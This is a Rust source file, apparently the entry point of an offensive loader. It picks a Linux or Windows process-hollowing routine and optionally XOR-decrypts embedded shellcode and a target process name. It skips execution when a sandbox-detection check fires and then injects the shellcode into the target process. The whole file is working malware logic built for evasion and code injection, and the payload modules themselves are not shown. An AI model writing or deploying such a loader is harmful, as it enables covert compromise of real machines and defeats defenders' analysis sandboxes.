use std::str;

// Load Linux implementation if the target OS is Linux
#[cfg(target_os = "linux")]
mod rco_process_hollowing_linux;
#[cfg(target_os = "linux")]
use rco_process_hollowing_linux::hollow_and_run;
// Determine which shellcode and target process to use based on features
#[cfg(all(target_os = "linux", not(feature = "xor")))]
const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
#[cfg(all(target_os = "linux", not(feature = "xor")))]
const TARGET_PROCESS: &[u8] = rco_config::LINUX_HOLLOWING_TARGET.as_bytes();
#[cfg(all(target_os = "linux", feature = "xor"))]
const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;
#[cfg(all(target_os = "linux", feature = "xor"))]
const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_LINUX_HOLLOWING_TARGET;

// Load Windows implementation if the target OS is Windows
#[cfg(all(windows, not(feature = "antistring")))]
mod rco_process_hollowing_windows;
#[cfg(all(windows, not(feature = "antistring")))]
use rco_process_hollowing_windows::hollow_and_run;
#[cfg(all(windows, feature = "antistring"))]
mod rco_process_hollowing_windows_antistring;
#[cfg(all(windows, feature = "antistring"))]
use rco_process_hollowing_windows_antistring::hollow_and_run;
// Determine which shellcode and target process to use based on features
#[cfg(all(windows, not(feature = "xor")))]
const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
#[cfg(all(windows, not(feature = "xor")))]
const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_HOLLOWING_TARGET.as_bytes();
#[cfg(all(windows, feature = "xor"))]
const SHELLCODE: &[u8] = rco_config::ENCRYPTED_WINDOWS_SHELLCODE;
#[cfg(all(windows, feature = "xor"))]
const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_WINDOWS_HOLLOWING_TARGET;

fn main() {
    // Runs the sandbox detection function or the dummy replacement, dependent on features
    if rco_utils::pound_sand() {
        return;
    }

    // Decrypts the shellcode and target process or returns them unchanged, dependent on features
    let shellcode = rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, SHELLCODE).unwrap();
    let target_process =
        rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, TARGET_PROCESS).unwrap();
    let target_process = str::from_utf8(&target_process).unwrap();

    // Runs whichever version of the attack was compiled
    hollow_and_run(&shellcode, target_process);
}
